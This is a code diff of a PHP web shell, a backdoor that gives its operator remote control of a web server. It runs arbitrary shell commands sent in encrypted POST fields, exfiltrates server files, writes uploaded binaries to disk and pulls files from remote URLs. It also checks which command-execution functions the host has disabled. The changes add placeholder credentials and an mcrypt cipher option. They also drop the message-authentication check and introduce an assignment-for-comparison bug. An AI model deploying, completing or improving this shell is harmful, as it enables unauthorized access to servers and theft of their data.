@@ -4,6 +4,7 @@ ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 
+// This script should be run via HTTP only
 if (php_sapi_name() === 'cli') {
     exit(-1);
 }
@@ -14,9 +15,9 @@ if (!is_function_available('openssl_encrypt')) {
 }
 
 $key = '[KEY_HERE]';
+$login = '[LOGIN_HERE]';
+$password = '[PASSWORD_HERE]';
 
-$login = 'root';
-$password = 'toor';
 header("Content-type: plain/text");
 header("Pragma: no-cache");
 header("Expires: 0");
@@ -28,6 +29,7 @@ require_auth($login, $password);
 // Internal actions
 if (isset($_POST['i'])) {
     $action = base64_decode($_POST['i']);
+
     if ($action == 'ping') {
         header("HTTP/1.1 200 OK");
         $owner = '';
@@ -56,7 +58,7 @@ if (isset($_POST['i'])) {
             'tools' => implode('|', find_tools()),
             'method' => $method
         ));
-        echo encrypt($output, $key);
+        echo encrypt($output, $key, $method);
     }
     exit(0);
 }
@@ -75,7 +77,7 @@ chdir($path);
 
 if (isset($_POST['c'])) {
     // Receiving the command
-    $cmd = base64_decode(decrypt($_POST['c'], $key));
+    $cmd = base64_decode(decrypt($_POST['c'], $key, $method));
 
     // If we receive a `cd` command, we need to move ...
     if (substr($cmd, 0, 3) == 'cd ') {
@@ -98,12 +100,11 @@ if (isset($_POST['c'])) {
     }
 }
 
-// File manager
 if (isset($_POST['f'])) {
     $files = $_POST['f'];
     if (isset($files['d'])) {
         foreach ($files['d'] as $file) {
-            $name = base64_decode(decrypt($file, $key));
+            $name = base64_decode(decrypt($file, $key, $method));
             $payload = file_to_base64($name);
             array_push($downloads, array(
                 'name' => $name,
@@ -114,8 +115,8 @@ if (isset($_POST['f'])) {
 
     if (isset($files['u'])) {
         foreach ($files['u'] as $encrypted_url) {
-            $name = base64_decode(decrypt($encrypted_url['n'], $key));
-            $payload = base64_decode(decrypt($encrypted_url['p'], $key));
+            $name = base64_decode(decrypt($encrypted_url['n'], $key, $method));
+            $payload = base64_decode(decrypt($encrypted_url['p'], $key, $method));
             $result = download_file_from_url($payload, $path, $name);
             if (is_null($result)) {
                 $output .= "Permission denied {$path}/{$name}\n";
@@ -129,8 +130,8 @@ if (isset($_POST['f'])) {
 
     if (isset($files['b'])) {
         foreach ($files['b'] as $encrypted_binary) {
-            $name = base64_decode(decrypt($encrypted_binary['n'], $key));
-            $payload = base64_decode(decrypt($encrypted_binary['p'], $key));
+            $name = base64_decode(decrypt($encrypted_binary['n'], $key, $method));
+            $payload = base64_decode(decrypt($encrypted_binary['p'], $key, $method));
             $result = base64_to_file($payload, $path, $name);
             if (is_null($result)) {
                 $output .= "Permission denied {$path}/{$name}\n";
@@ -147,7 +148,7 @@ $response = array(
     'path' => base64_encode(getcwd()),
     'files' => $downloads
 );
-exit(encrypt(json_encode($response), $key));
+exit(encrypt(json_encode($response), $key, $method));
 
 /*------------------*/
 /*- Core Functions -*/
@@ -276,7 +277,7 @@ function disabled_functions()
         $df = ini_get('disable_functions');
         $shfb = ini_get('suhosin.executor.func.blacklist');
         $fn_list = array_map('trim', explode(',', "$df,$shfb"));
-        $disabled_fn = array_filter($fn_list, create_function('$value', 'return $value !== "";'));
+        $disabled_fn = array_filter($fn_list, @create_function('$value', 'return $value !== "";'));
     }
 
     return $disabled_fn;
@@ -388,34 +389,51 @@ function download_file_from_url($url, $path, $output_file)
     return $output_file;
 }
 
-// Encrypt string
-function encrypt($plaintext, $secret_key, $method = 'openssql')
+// Encrypts a string
+function encrypt($plaintext, $secret_key, $method = 'openssl')
 {
-    $cipher = "AES-256-CBC";
-    $key = hash_pbkdf2('sha256', $secret_key, '', 10000, 0, true);
+    $ciphertext = '';
 
-    $ivlen = openssl_cipher_iv_length($cipher);
-    $iv = openssl_random_pseudo_bytes($ivlen);
-    $ciphertext_raw = openssl_encrypt($plaintext, $cipher, $key, $options = OPENSSL_RAW_DATA, $iv);
-    $hmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary = true);
-    $ciphertext = base64_encode($iv . $hmac . $ciphertext_raw);
+    if($method=='openssl') {
+        $key = $secret_key;
+        $cipher = "AES-256-CBC";
+        $ivlen = openssl_cipher_iv_length($cipher);
+        $iv = openssl_random_pseudo_bytes($ivlen);
+        $ciphertext_raw = openssl_encrypt($plaintext, $cipher, $key, $options = OPENSSL_RAW_DATA, $iv);
+        $hmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary = true);
+        $ciphertext = base64_encode($iv . $hmac . $ciphertext_raw);
+    } elseif ($method='mcrypt') {
+        $key = pack('H*', $secret_key);
+        $iv_size = @mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC);
+        $iv = @mcrypt_create_iv($iv_size, MCRYPT_RAND);
+        $ciphertext = @mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $plaintext, MCRYPT_MODE_CBC, $iv);
+        $ciphertext = $iv . $ciphertext;
+        $ciphertext = base64_encode($ciphertext);
+    }
 
     return $ciphertext;
 }
 
-// Decrypt string
-function decrypt($ciphertext, $secret_key, $method = 'openssql')
+// Decrypts an encrypted string
+function decrypt($ciphertext, $secret_key, $method = 'openssl')
 {
-    $cipher = "AES-256-CBC";
-    $key = hash_pbkdf2('sha256', $secret_key, '', 10000, 0, true);
+    $ciphertext_decoded = base64_decode($ciphertext);
 
-    $c = base64_decode($ciphertext);
-    $ivlen = openssl_cipher_iv_length($cipher);
-    $iv = substr($c, 0, $ivlen);
-    $hmac = substr($c, $ivlen, $sha2len = 32);
-    $ciphertext_raw = substr($c, $ivlen + $sha2len);
-    $original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $key, $options = OPENSSL_RAW_DATA, $iv);
-    $calcmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary = true);
-
-    return hash_equals($hmac, $calcmac) ? $original_plaintext : null;
+    if($method=='openssl') {
+        $key = $secret_key;
+        $cipher = "AES-256-CBC";
+        $ivlen = openssl_cipher_iv_length($cipher);
+        $iv = substr($ciphertext_decoded, 0, $ivlen);
+        $hmac = substr($ciphertext_decoded, $ivlen, $sha2len = 32);
+        $ciphertext_raw = substr($ciphertext_decoded, $ivlen + $sha2len);
+        $original_plaintext = @openssl_decrypt($ciphertext_raw, $cipher, $key, $options = OPENSSL_RAW_DATA, $iv);
+        $calcmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary = true);
+        return trim($original_plaintext);
+    } elseif ($method='mcrypt') {
+        $key = pack('H*', $secret_key);
+        $iv_size = @mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC);
+        $iv_dec = substr($ciphertext_decoded, 0, $iv_size);
+        $ciphertext_dec = substr($ciphertext_decoded, $iv_size);
+        return trim(@mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $ciphertext_dec, MCRYPT_MODE_CBC, $iv_dec));
+    }
 }
